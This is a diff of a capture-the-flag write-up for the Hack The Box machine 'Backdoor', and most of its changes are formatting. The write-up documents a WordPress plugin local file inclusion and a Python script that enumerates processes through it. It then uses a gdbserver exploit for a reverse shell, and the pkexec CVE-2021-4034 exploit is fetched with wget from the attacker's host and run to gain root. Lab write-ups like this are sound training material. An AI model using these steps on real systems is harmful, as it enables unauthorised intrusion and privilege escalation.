@@ -2,7 +2,7 @@
 
 ## Enumeration
 
-The IP is 10.10.11.125, I will add it to _/etc/hosts_:
+The IP is 10.10.11.125, I will add it to **/etc/hosts**:
 
 ![/etc/hosts/ picture](screenshots/etc-hosts.png)
 
@@ -18,7 +18,7 @@ Host: 10.10.11.125 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 1337/o
   
 It returns ports 22, 80 and 1337 as being open. 
   
-I will run a _nmap_ script to list the services and their versions that are running on each open port
+I will run a **nmap** script to list the services and their versions that are running on each open port
   
 ```bash
 $ nmap -p22,80,1337 -sCV backdoor.htb -oN targeted
@@ -39,7 +39,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 If you try to access via browser you will get an innocent website, where you can't do much.
 
-Let's try to list subdirectories using _wfuzz_:
+Let's try to list subdirectories using **wfuzz**:
 
 ```bash
 wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u "backdoor.htb/FUZZ" --hc=404 -c
@@ -52,10 +52,10 @@ ID           Response   Lines    Word       Chars       Payload
 000006941:   301        9 L      28 W       315 Ch      "wp-admin"
 ```
 
-The subdirectory _wp-content_ is not visible to us, _wp-includes_ contains the plugins and themes, although we can't see the contents of the files.
-Playing around with _wp-admin_ there doesn't seem to be any default credentials set.
+The subdirectory **wp-content** is not visible to us,**wp-includes** contains the plugins and themes, although we can't see the contents of the files.
+Playing around with **wp-admin** there doesn't seem to be any default credentials set.
 
-So, knowing that we are dealing with _Wordpress_ as the CMS, we can try running _wpscan_ to list vulnerable plugins.
+So, knowing that we are dealing with **Wordpress **as the CMS, we can try running **wpscan** to list vulnerable plugins.
 You will need an API token, which you can get [here](wpscan.com).
 
 ```bash
@@ -88,17 +88,17 @@ $ wpscan --url http://backdoor.htb/ --enumerate vp --plugins-detection aggressiv
 
 ## Foothold
 
-We can see that there is a vulnerable version of the plugin **Ebook Download**. If we search for it on _searchsploit_, we fill find an exploit with **id 39575**.
+We can see that there is a vulnerable version of the plugin **Ebook Download**. If we search for it on **searchsploit**, we fill find an exploit with **id 39575**.
 I will download it on my computer using:
 
 `$ searchsploit -m 39575`
 
 If we open the text file, we can see that the plugin is vulnerable to Local File Inclusion,
-using the following url, where _path_ is a valid route in the target machine.
+using the following url, where **path** is a valid route in the target machine.
 
-> _http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=path_
+> http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=[path]
 
-We can list running processes using the path /proc/_pid_/cmdline, where pid is a valid process ID.
+We can list running processes using the path /proc/[PID]/cmdline, where pid is a valid process ID.
 Using a Python script to iterate through the PIDs, we can find which are running.
 
 ```python
@@ -133,20 +133,21 @@ for pid in range(0,5000):
         print("--------------------------------------------\n")
 ```
 
-We see that there's a service called _gdbserver_ running on the open port 1337:
+We see that there's a service called **gdbserver** running on the open port 1337:
   
 ```bash
 [+] Process 850 found
 b'/proc/850/cmdline/proc/850/cmdline/proc/850/cmdline/bin/sh\x00-c\x00while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;";done\x00<script>window.close()</script>'
 ```
   
-If we look for it on _searchsploit_ we will find a vulnerability with **id 50539**.
-If we run it and follow the instructions provided, we can get a reverse shell as _user_ and view the flag.
+If we look for it on **searchsploit** we will find a vulnerability with **id 50539**.
+If we run it and follow the instructions provided, we can get a reverse shell as **user** and view the flag.
 
 ![whoami output](screenshots/foothold.png)
 
 ## Privilege Escalation
 Once we are inside the victim's machine, we can enumerate binaries with the SUID permission set:
+
 ```bash
 user@Backdoor:/home/user$ find / -perm -u=s 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
@@ -168,7 +169,7 @@ user@Backdoor:/home/user$ find / -perm -u=s 2>/dev/null
 /usr/bin/pkexec
 ```
 
-We can see that the binary _pkexec_ is available, which has been compromised recently under the _CVE-2021-4034_ vulnerability.
+We can see that the binary **pkexec** is available, which has been compromised recently under the **CVE-2021-4034** vulnerability.
 There are many exploits out there, I have used [this one](https://github.com/Almorabea/pkexec-exploit).
 Now it's simply a matter of setting up a Python server so you can share the file with the victim's machine and run it.
 
@@ -181,5 +182,5 @@ user@Backdoor:/home/user$ wget 10.10.16.43:80/CVE-2021-4034.py
 user@Backdoor:/home/user$ python3 CVE-2021-4034.py
 ```
 
-Just like that, we have become _root_:
+Just like that, we have become **root**:
 ![Root screenshot](screenshots/root.png)
